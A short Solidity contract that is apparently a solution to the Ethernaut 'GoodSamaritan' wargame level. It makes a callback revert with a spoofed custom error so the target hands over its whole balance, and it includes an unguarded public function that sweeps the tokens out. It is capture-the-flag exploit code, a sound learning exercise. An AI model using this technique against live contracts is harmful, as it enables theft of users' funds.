// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./27_GoodSamaritan.sol";

contract GoodSamaritanHack {
    error NotEnoughBalance();

    function exploit(address goodSamaritan) external {
        GoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) revert NotEnoughBalance();
    }

    function sweepToken(address token) public {
        uint256 amount = Coin(token).balances(address(this));
        Coin(token).transfer(msg.sender, amount);
    }
}
